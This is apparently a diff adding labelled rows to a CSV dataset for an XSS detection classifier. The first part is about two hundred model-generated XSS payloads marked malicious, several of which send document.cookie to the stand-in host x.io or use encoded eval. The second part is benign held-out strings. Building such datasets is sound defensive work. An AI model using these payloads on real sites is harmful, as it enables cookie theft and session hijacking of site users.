+"""><video onfocus=print()>",1,xss,deepseek-r1
+'><iframe onerror=alert(1)>,1,xss,deepseek-r1
+'><video onfocus=print()>,1,xss,deepseek-r1
+<object onclick=confirm(1)>,1,xss,deepseek-r1
+'><body ontoggle=alert(document.cookie)>,1,xss,deepseek-r1
+"<video onfocus=""alert(1)"">",1,xss,deepseek-r1
+"""><img onerror=alert(1)>",1,xss,deepseek-r1
+<div onfocus=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
+'><a onmouseover=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+<a onload=alert(document.cookie)>,1,xss,deepseek-r1
+"<iframe onerror=""confirm(1)"">",1,xss,deepseek-r1
+"<audio onload=""alert(document.cookie)"">",1,xss,deepseek-r1
+'><video onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+'><script onload=alert(1)>,1,xss,deepseek-r1
+<a onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+<img onanimationstart=confirm(1)>,1,xss,deepseek-r1
+"""><img onfocus=location='//x.io'>",1,xss,deepseek-r1
+"<object onload=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
+"<svg onerror=""alert(1)"">",1,xss,deepseek-r1
+'><details onfocus=alert(1)>,1,xss,deepseek-r1
+"<details onmouseover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
+"""><marquee onload=alert(document.cookie)>",1,xss,deepseek-r1
+<scr<script>ipt>alert(document.cookie)</script>,1,xss,deepseek-r1
+<input onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
+'><input onload=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+"<details oninput=""print()"">",1,xss,deepseek-r1
+<script ontoggle=alert(document.cookie)>,1,xss,deepseek-r1
+'><a onload=print()>,1,xss,deepseek-r1
+"""><marquee onerror=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
+"<iframe onfocus=""alert(document.domain)"">",1,xss,deepseek-r1
+"<input onerror=""print()"">",1,xss,deepseek-r1
+<video oninput=alert(1)>,1,xss,deepseek-r1
+"""><marquee oninput=confirm(1)>",1,xss,deepseek-r1
+'><object onclick=alert(document.domain)>,1,xss,deepseek-r1
+'><iframe onload=confirm(1)>,1,xss,deepseek-r1
+<audio onload=alert(document.domain)>,1,xss,deepseek-r1
+"<input onclick=""print()"">",1,xss,deepseek-r1
+"""><div onerror=location='//x.io'>",1,xss,deepseek-r1
+'><video oninput=alert(document.cookie)>,1,xss,deepseek-r1
+"<iframe onfocus=""confirm(1)"">",1,xss,deepseek-r1
+"""><audio onerror=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
+'><div onpointerover=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+'><script onstart=print()>,1,xss,deepseek-r1
+"<div oninput=""alert(1)"">",1,xss,deepseek-r1
+'><div onmouseover=alert(document.cookie)>,1,xss,deepseek-r1
+<object onclick=alert(document.domain)>,1,xss,deepseek-r1
+<audio onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
+'><object oninput=confirm(1)>,1,xss,deepseek-r1
+"""><body onmouseover=confirm(1)>",1,xss,deepseek-r1
+<img onerror=alert(document.domain)>,1,xss,deepseek-r1
+<script onfocus=alert(document.domain)>,1,xss,deepseek-r1
+'><details onclick=location='//x.io'>,1,xss,deepseek-r1
+<input onfocus=alert(1)>,1,xss,deepseek-r1
+"""><body onload=print()>",1,xss,deepseek-r1
+'><video oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+'><input onanimationstart=alert(document.domain)>,1,xss,deepseek-r1
+'><a onanimationstart=location='//x.io'>,1,xss,deepseek-r1
+"""><details onstart=print()>",1,xss,deepseek-r1
+"<iframe onanimationstart=""confirm(1)"">",1,xss,deepseek-r1
+'><details onanimationstart=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+'><input onfocus=print()>,1,xss,deepseek-r1
+"""><audio onmouseover=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
+<audio onclick=alert(document.cookie)>,1,xss,deepseek-r1
+"<iframe onclick=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
+"<body onstart=""alert(document.domain)"">",1,xss,deepseek-r1
+"""><input onstart=alert(document.cookie)>",1,xss,deepseek-r1
+"<div ontoggle=""alert(document.domain)"">",1,xss,deepseek-r1
+"<video onpointerover=""print()"">",1,xss,deepseek-r1
+<object onload=alert(1)>,1,xss,deepseek-r1
+"<svg ontoggle=""alert(document.cookie)"">",1,xss,deepseek-r1
+"<iframe onmouseover=""confirm(1)"">",1,xss,deepseek-r1
+'><audio onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
+"<script onstart=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
+<audio onclick=alert(1)>,1,xss,deepseek-r1
+"""><svg onerror=location='//x.io'>",1,xss,deepseek-r1
+<img oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+<object onfocus=location='//x.io'>,1,xss,deepseek-r1
+'><a onfocus=alert(document.cookie)>,1,xss,deepseek-r1
+<a oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+<marquee onmouseover=alert(document.cookie)>,1,xss,deepseek-r1
+<details onanimationstart=confirm(1)>,1,xss,deepseek-r1
+"""><video oninput=alert(document.cookie)>",1,xss,deepseek-r1
+"<script onanimationstart=""print()"">",1,xss,deepseek-r1
+'><object ontoggle=location='//x.io'>,1,xss,deepseek-r1
+"""><details onload=alert(document.cookie)>",1,xss,deepseek-r1
+"""><details onclick=print()>",1,xss,deepseek-r1
+<scr<script>ipt>confirm(1)</script>,1,xss,deepseek-r1
+"<img onload=""alert(document.cookie)"">",1,xss,deepseek-r1
+'><audio onstart=alert(document.domain)>,1,xss,deepseek-r1
+'><a onfocus=print()>,1,xss,deepseek-r1
+"""><iframe onstart=alert(1)>",1,xss,deepseek-r1
+'><audio onstart=alert(1)>,1,xss,deepseek-r1
+"""><input onstart=alert(document.domain)>",1,xss,deepseek-r1
+'><details onfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+"""><details onpointerover=confirm(1)>",1,xss,deepseek-r1
+<body onstart=print()>,1,xss,deepseek-r1
+"<div onfocus=""alert(document.domain)"">",1,xss,deepseek-r1
+'><iframe onload=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
+"<div onerror=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
+"""><img onclick=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
+<details onanimationstart=print()>,1,xss,deepseek-r1
+<details onstart=alert(1)>,1,xss,deepseek-r1
+<object onfocus=alert(document.domain)>,1,xss,deepseek-r1
+'><a oninput=location='//x.io'>,1,xss,deepseek-r1
+"""><a onanimationstart=alert(document.domain)>",1,xss,deepseek-r1
+<input onmouseover=alert(document.domain)>,1,xss,deepseek-r1
+"<iframe onclick=""print()"">",1,xss,deepseek-r1
+"""><input onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
+<script ontoggle=print()>,1,xss,deepseek-r1
+"<script onstart=""alert(document.cookie)"">",1,xss,deepseek-r1
+"""><input onload=alert(document.domain)>",1,xss,deepseek-r1
+<ScRiPt>FETCH('//X.IO/'+DOCUMENT.COOKIE)</ScRiPt>,1,xss,deepseek-r1
+"<input onpointerover=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
+"""><video ontoggle=alert(1)>",1,xss,deepseek-r1
+"""><details onstart=location='//x.io'>",1,xss,deepseek-r1
+<object onpointerover=print()>,1,xss,deepseek-r1
+'><audio ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
+"<marquee onanimationstart=""confirm(1)"">",1,xss,deepseek-r1
+'><audio onload=alert(document.domain)>,1,xss,deepseek-r1
+<svg onmouseover=alert(1)>,1,xss,deepseek-r1
+"""><iframe onanimationstart=alert(1)>",1,xss,deepseek-r1
+'><body onclick=alert(document.cookie)>,1,xss,deepseek-r1
+<video onclick=confirm(1)>,1,xss,deepseek-r1
+"""><div onpointerover=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
+<div onerror=confirm(1)>,1,xss,deepseek-r1
+"<img onmouseover=""location='//x.io'"">",1,xss,deepseek-r1
+'><object onpointerover=confirm(1)>,1,xss,deepseek-r1
+'><iframe onmouseover=alert(document.domain)>,1,xss,deepseek-r1
+"<details onerror=""alert(document.cookie)"">",1,xss,deepseek-r1
+<video onmouseover=alert(document.domain)>,1,xss,deepseek-r1
+'><details onfocus=print()>,1,xss,deepseek-r1
+"<a onerror=""alert(document.cookie)"">",1,xss,deepseek-r1
+<input onerror=location='//x.io'>,1,xss,deepseek-r1
+'><audio onerror=alert(1)>,1,xss,deepseek-r1
+"""><iframe ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
+'><video onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
+'><div onstart=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
+'><iframe onerror=alert(document.cookie)>,1,xss,deepseek-r1
+"""><svg onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
+"""><audio oninput=confirm(1)>",1,xss,deepseek-r1
+<body onanimationstart=alert(1)>,1,xss,deepseek-r1
+"""><div onfocus=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
+"""><a onerror=print()>",1,xss,deepseek-r1
+<script onclick=alert(document.cookie)>,1,xss,deepseek-r1
+'><img onmouseover=confirm(1)>,1,xss,deepseek-r1
+"""><audio onload=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
+"<marquee ontoggle=""alert(document.domain)"">",1,xss,deepseek-r1
+"""><a ontoggle=alert(document.domain)>",1,xss,deepseek-r1
+"<a onfocus=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
+<video onstart=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+"<marquee onstart=""location='//x.io'"">",1,xss,deepseek-r1
+"<script onpointerover=""alert(document.domain)"">",1,xss,deepseek-r1
+<body onerror=alert(document.cookie)>,1,xss,deepseek-r1
+"<script oninput=""confirm(1)"">",1,xss,deepseek-r1
+'><svg onfocus=alert(1)>,1,xss,deepseek-r1
+"""><img ontoggle=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
+"<a onanimationstart=""print()"">",1,xss,deepseek-r1
+'><marquee onclick=alert(document.domain)>,1,xss,deepseek-r1
+'><svg onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+'><body onstart=alert(document.cookie)>,1,xss,deepseek-r1
+"""><marquee onload=confirm(1)>",1,xss,deepseek-r1
+'><video onload=location='//x.io'>,1,xss,deepseek-r1
+"""><audio onload=alert(document.cookie)>",1,xss,deepseek-r1
+"<input onload=""print()"">",1,xss,deepseek-r1
+'><body ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+"""><audio onerror=alert(document.cookie)>",1,xss,deepseek-r1
+<audio oninput=confirm(1)>,1,xss,deepseek-r1
+"""><img ontoggle=confirm(1)>",1,xss,deepseek-r1
+"""><div oninput=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
+"""><div onmouseover=alert(1)>",1,xss,deepseek-r1
+<video oninput=print()>,1,xss,deepseek-r1
+<script onanimationstart=location='//x.io'>,1,xss,deepseek-r1
+<div onload=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
+<details onerror=location='//x.io'>,1,xss,deepseek-r1
+'><script onmouseover=location='//x.io'>,1,xss,deepseek-r1
+"<object onclick=""alert(1)"">",1,xss,deepseek-r1
+"<input onclick=""alert(1)"">",1,xss,deepseek-r1
+<body onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
+"""><audio onclick=alert(document.cookie)>",1,xss,deepseek-r1
+"<video oninput=""print()"">",1,xss,deepseek-r1
+<object onanimationstart=location='//x.io'>,1,xss,deepseek-r1
+"""><script onfocus=print()>",1,xss,deepseek-r1
+'><svg onanimationstart=confirm(1)>,1,xss,deepseek-r1
+'><script oninput=alert(document.cookie)>,1,xss,deepseek-r1
+"""><svg onload=alert(document.domain)>",1,xss,deepseek-r1
+"<img onpointerover=""alert(document.domain)"">",1,xss,deepseek-r1
+'><audio onerror=alert(document.domain)>,1,xss,deepseek-r1
+'><a onmouseover=location='//x.io'>,1,xss,deepseek-r1
+'><details onpointerover=confirm(1)>,1,xss,deepseek-r1
+"<object onerror=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
+"""><details ontoggle=alert(document.cookie)>",1,xss,deepseek-r1
+"<img onfocus=""confirm(1)"">",1,xss,deepseek-r1
+<img onclick=confirm(1)>,1,xss,deepseek-r1
+<iframe onstart=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+"<body onpointerover=""print()"">",1,xss,deepseek-r1
+'><object onfocus=location='//x.io'>,1,xss,deepseek-r1
+"<details oninput=""alert(1)"">",1,xss,deepseek-r1
+"<body onload=""alert(document.cookie)"">",1,xss,deepseek-r1
+"<iframe onanimationstart=""location='//x.io'"">",1,xss,deepseek-r1
+'><script onload=confirm(1)>,1,xss,deepseek-r1
+<a ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+'><video onload=alert(1)>,1,xss,deepseek-r1
+<svg onmouseover=location='//x.io'>,1,xss,deepseek-r1
+The regex \bword\b matches the expected input format.,0,benign,held_out_benign
+The SELECT statement retrieves rows; use WHERE to filter and ORDER BY to sort.,0,benign,held_out_benign
+if (count >= 10 || retry) { throw new Error('x'); },0,benign,held_out_benign
+"git commit -m ""fix: resolve null pointer in auth module""",0,benign,held_out_benign
+Smith & Sons Law Firm LLC,0,benign,held_out_benign
+Contact Müller at 49 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at C:\Users\Admin\setup.bat and edit line 42.,0,benign,held_out_benign
+Contact Kowalski at 86 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+Email a_b-c@company.org or ping @a_b-c on Slack.,0,benign,held_out_benign
+if (x != y && z > 0) { grantAccess(); },0,benign,held_out_benign
+Contact Müller at 61 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+if (flag & MASK) { throw new Error('x'); },0,benign,held_out_benign
+Contact John at 5 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+Email dev.ops@company.com or ping @dev.ops on Slack.,0,benign,held_out_benign
+Contact Ng at 60 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+Contact van der Berg at 28 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at C:\Users\Admin\main.py and edit line 42.,0,benign,held_out_benign
+if (a['key'] == b['key']) { queue.push(item); },0,benign,held_out_benign
+Email a_b-c@company.co.uk or ping @a_b-c on Slack.,0,benign,held_out_benign
+Contact O'Brien at 89 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+Contact O'Brien at 46 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Contact D'Angelo at 70 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+Contact Kowalski at 84 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+if (user.role == 'admin') { return true; },0,benign,held_out_benign
+Email team+alerts@company.org or ping @team+alerts on Slack.,0,benign,held_out_benign
+if (flag & MASK) { queue.push(item); },0,benign,held_out_benign
+Recipe: mix 2 cups flour w/ 1 tsp salt; bake @ 350F for 20 min.,0,benign,held_out_benign
+Contact Müller at 76 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+In the lecture we derived: A OR B = 1 when either is true.,0,benign,held_out_benign
+Meeting notes 10/25: discussed Q3 <-> Q4 transition plan.,0,benign,held_out_benign
+Contact Ng at 15 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+"She said ""1=1 is always true"" during the boolean-logic lecture.",0,benign,held_out_benign
+Contact van der Berg at 10 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+if (count >= 10 || retry) { queue.push(item); },0,benign,held_out_benign
+Contact Müller at 10 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+The onclick attribute runs a function when the element is clicked.,0,benign,held_out_benign
+Contact María at 45 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+Contact Kowalski at 26 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+Contact O'Malley at 83 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+if (flag & MASK) { grantAccess(); },0,benign,held_out_benign
+Contact Müller at 85 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+if (status == 200) { return true; },0,benign,held_out_benign
+Contact John at 75 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Contact Smith at 6 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+Contact O'Malley at 35 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+Contact Kowalski at 35 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+Contact Smith at 77 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+The regex ^https?://.+$ matches the expected input format.,0,benign,held_out_benign
+Open the file at C:\Program Files\Tool\config.yml and edit line 42.,0,benign,held_out_benign
+In the lecture we derived: 1 < n && n <= 100.,0,benign,held_out_benign
+Email j.smith@company.org or ping @j.smith on Slack.,0,benign,held_out_benign
+"Address: 42 O'Malley Ave, Apt #7, (near the park)",0,benign,held_out_benign
+Email dev.ops@company.net or ping @dev.ops on Slack.,0,benign,held_out_benign
+cost = qty * unit_price; if (cost > budget) { flag(); },0,benign,held_out_benign
+Email a_b-c@company.net or ping @a_b-c on Slack.,0,benign,held_out_benign
+"My favorite quote: ""to be or not to be"" -- Shakespeare",0,benign,held_out_benign
+Contact van der Berg at 72 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at /var/log/nginx/setup.bat and edit line 42.,0,benign,held_out_benign
+Contact MacLeod at 99 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+Contact Müller at 22 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at D:\Projects\app\error.log and edit line 42.,0,benign,held_out_benign
+"123 O'Connell St, Dublin",0,benign,held_out_benign
+Error code: 500 (Internal Server Error) -- see logs for details.,0,benign,held_out_benign
+Contact O'Brien at 11 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+Contact María at 83 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+In the lecture we derived: SELECT-style set notation: {x | x > 0}.,0,benign,held_out_benign
+Email j.smith@company.net or ping @j.smith on Slack.,0,benign,held_out_benign
+Email dev.ops@company.io or ping @dev.ops on Slack.,0,benign,held_out_benign
+Contact van der Berg at 4 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+"The regex (foo|bar){1,3} matches the expected input format.",0,benign,held_out_benign
+Email team+alerts@company.io or ping @team+alerts on Slack.,0,benign,held_out_benign
+Email j.smith@company.io or ping @j.smith on Slack.,0,benign,held_out_benign
+if (status == 200) { log.info('ok'); },0,benign,held_out_benign
+Contact Müller at 7 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Contact D'Angelo at 65 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+Email dev.ops@company.org or ping @dev.ops on Slack.,0,benign,held_out_benign
+Contact O'Malley at 46 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at C:\Program Files\Tool\main.py and edit line 42.,0,benign,held_out_benign
+Contact D'Angelo at 63 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+Contact O'Malley at 72 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+if (status == 200) { throw new Error('x'); },0,benign,held_out_benign
+Escaping user input prevents script injection on the page.,0,benign,held_out_benign
+Contact María at 4 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+if (x != y && z > 0) { queue.push(item); },0,benign,held_out_benign
+Email team+alerts@company.net or ping @team+alerts on Slack.,0,benign,held_out_benign
+Open the file at C:\Program Files\Tool\data\out.csv and edit line 42.,0,benign,held_out_benign
+Contact María at 79 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+In the lecture we derived: dx/dt = 3x - 2.,0,benign,held_out_benign
+if (count >= 10 || retry) { return true; },0,benign,held_out_benign
+Open the file at ~/scripts/error.log and edit line 42.,0,benign,held_out_benign
+Contact van der Berg at 19 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at D:\Projects\app\setup.bat and edit line 42.,0,benign,held_out_benign
+Contact O'Malley at 39 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Contact María at 80 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at C:\Users\Admin\config.yml and edit line 42.,0,benign,held_out_benign
+Product SKU# ABC-123; Category: Electronics & Gadgets (in stock).,0,benign,held_out_benign
+"The DROP command deletes a table, so use it carefully in migrations.",0,benign,held_out_benign
+Email team+alerts@company.com or ping @team+alerts on Slack.,0,benign,held_out_benign
+Contact John at 86 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+Contact Chen at 1 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at /var/log/nginx/data\out.csv and edit line 42.,0,benign,held_out_benign
+if (user.role == 'admin') { log.info('ok'); },0,benign,held_out_benign
+Contact us at support@company.com or call (555) 123-4567.,0,benign,held_out_benign
+Contact Ng at 12 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+if (a['key'] == b['key']) { log.info('ok'); },0,benign,held_out_benign
+Open the file at C:\Program Files\Tool\error.log and edit line 42.,0,benign,held_out_benign
+Open the file at D:\Projects\app\main.py and edit line 42.,0,benign,held_out_benign
+if (x != y && z > 0) { throw new Error('x'); },0,benign,held_out_benign
+Contact Smith at 87 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at /var/log/nginx/error.log and edit line 42.,0,benign,held_out_benign
+Wrap the content in <table> and <tr> tags to build the layout.,0,benign,held_out_benign
+Email j.smith@company.com or ping @j.smith on Slack.,0,benign,held_out_benign
+Contact O'Brien at 99 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+Contact Ng at 20 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+"Rated 4.5/5 stars -- ""great product, fast shipping!""",0,benign,held_out_benign
+Contact Chen at 91 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+if (x != y && z > 0) { return true; },0,benign,held_out_benign
+Contact D'Angelo at 60 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+Contact John at 57 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at C:\Program Files\Tool\setup.bat and edit line 42.,0,benign,held_out_benign
+Contact D'Angelo at 86 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at C:\Users\Admin\error.log and edit line 42.,0,benign,held_out_benign
+Email a_b-c@company.com or ping @a_b-c on Slack.,0,benign,held_out_benign
+Email j.smith@company.co.uk or ping @j.smith on Slack.,0,benign,held_out_benign
+if (user.role == 'admin') { queue.push(item); },0,benign,held_out_benign
+Open the file at ~/scripts/setup.bat and edit line 42.,0,benign,held_out_benign
+Use parameterised queries instead of string concatenation for safety.,0,benign,held_out_benign
+Contact Chen at 10 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+Email team+alerts@company.co.uk or ping @team+alerts on Slack.,0,benign,held_out_benign
+Contact Chen at 66 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+In the lecture we derived: P(A|B) = P(B|A)*P(A)/P(B).,0,benign,held_out_benign
+Contact Smith at 66 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at /var/log/nginx/main.py and edit line 42.,0,benign,held_out_benign
+Contact Smith at 12 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+An <iframe> embeds another document inside the current page.,0,benign,held_out_benign
+if (a['key'] == b['key']) { throw new Error('x'); },0,benign,held_out_benign
+Contact Ng at 92 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Contact O'Malley at 62 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+"The regex [A-Z]{2,4}-\d+ matches the expected input format.",0,benign,held_out_benign
+Contact D'Angelo at 9 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+Contact Smith at 75 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+Product SKU# ABC-123; Category: Electronics & Gadgets,0,benign,held_out_benign
+Contact Smith at 9 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+Contact John at 1 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+Discount code SAVE20% applies to orders over $50.,0,benign,held_out_benign
+Contact MacLeod at 40 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+if (a['key'] == b['key']) { return true; },0,benign,held_out_benign
+Contact MacLeod at 86 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+Contact O'Brien at 13 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+"Please review section 3.2(a) of the contract, re: pricing.",0,benign,held_out_benign
+if (count >= 10 || retry) { log.info('ok'); },0,benign,held_out_benign
+if (status == 200) { grantAccess(); },0,benign,held_out_benign
+if (flag & MASK) { return true; },0,benign,held_out_benign
+Email a_b-c@company.io or ping @a_b-c on Slack.,0,benign,held_out_benign
+The regex ^[a-z]+@[a-z]+\.(com|org)$ matches the expected input format.,0,benign,held_out_benign
+Contact Ng at 24 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+Contact MacLeod at 19 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Contact O'Brien at 31 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+Contact John at 15 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+The regex \d{3}-\d{4} matches the expected input format.,0,benign,held_out_benign
+Contact Chen at 43 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at ~/scripts/main.py and edit line 42.,0,benign,held_out_benign
+Contact O'Malley at 9 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+Contact MacLeod at 15 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+if (status == 200) { queue.push(item); },0,benign,held_out_benign
+Contact O'Brien at 3 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+Contact María at 62 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at ~/scripts/data\out.csv and edit line 42.,0,benign,held_out_benign
+Contact Ng at 2 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
+In the lecture we derived: f(x) = x^2 + 1 for x != 0.,0,benign,held_out_benign
+Contact D'Angelo at 32 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
+Contact MacLeod at 68 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at D:\Projects\app\config.yml and edit line 42.,0,benign,held_out_benign
+Contact Kowalski at 68 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+Contact Kowalski at 59 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at D:\Projects\app\data\out.csv and edit line 42.,0,benign,held_out_benign
+if (user.role == 'admin') { throw new Error('x'); },0,benign,held_out_benign
+Contact Chen at 19 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
+"Rated 4.5/5 -- ""great value & fast shipping!"" per the review.",0,benign,held_out_benign
+Contact Chen at 3 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+Open the file at C:\Users\Admin\data\out.csv and edit line 42.,0,benign,held_out_benign
+Contact van der Berg at 64 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+"git commit -m ""fix: null check in auth('user') path""",0,benign,held_out_benign
+Contact van der Berg at 21 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+if (a['key'] == b['key']) { grantAccess(); },0,benign,held_out_benign
+A UNION combines two result sets that share the same columns.,0,benign,held_out_benign
+SELECT is a reserved keyword in most SQL dialects.,0,benign,held_out_benign
+if (count >= 10 || retry) { grantAccess(); },0,benign,held_out_benign
+Open the file at /var/log/nginx/config.yml and edit line 42.,0,benign,held_out_benign
+Contact María at 3 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+if (user.role == 'admin') { grantAccess(); },0,benign,held_out_benign
+Open the file at ~/scripts/config.yml and edit line 42.,0,benign,held_out_benign
+if (x != y && z > 0) { log.info('ok'); },0,benign,held_out_benign
+Email dev.ops@company.co.uk or ping @dev.ops on Slack.,0,benign,held_out_benign
+Contact John at 12 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
+Contact Kowalski at 32 Baker St re: the <draft> proposal.,0,benign,held_out_benign
+Contact MacLeod at 45 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
+if (flag & MASK) { log.info('ok'); },0,benign,held_out_benign
